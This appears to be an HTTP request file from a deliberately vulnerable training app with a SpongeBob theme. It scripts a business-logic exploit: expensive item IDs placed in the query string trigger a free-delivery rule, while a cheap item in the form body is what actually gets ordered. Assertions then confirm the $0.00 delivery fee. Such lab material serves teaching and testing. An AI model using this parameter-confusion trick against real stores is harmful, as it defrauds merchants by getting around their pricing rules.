# @import ../common/setup.http
@base = {{base_host}}/v102

### Plankton checks the menu for a cheap snack
# @name menu
GET {{base}}/menu

{{
  const menu = menu.response.body;
  exports.cheap_item = menu.find(i => i.price < 10);
  exports.expensive_item = menu.find(i => i.price > 20);
}}

### Exploit: Plankton tricks the Delivery Fee Calculator
# He puts expensive items in the URL (Query String) to trigger the "Free Delivery > $25" rule.
# But he puts his actual cheap item in the Body (Form Data) to pay less.
# @name exploit
POST {{base}}/orders?items={{expensive_item.item_id}}&items={{expensive_item.item_id}}
Authorization: {{sandy_auth}}
Content-Type: application/x-www-form-urlencoded

item={{cheap_item.item_id}}&delivery_address=Chum Bucket

# Verification: Order created for the cheap item, but the Delivery Fee is $0.00!
?? status == 201
?? body.delivery_fee == "0.00"
?? body.total == {{cheap_item.price}}
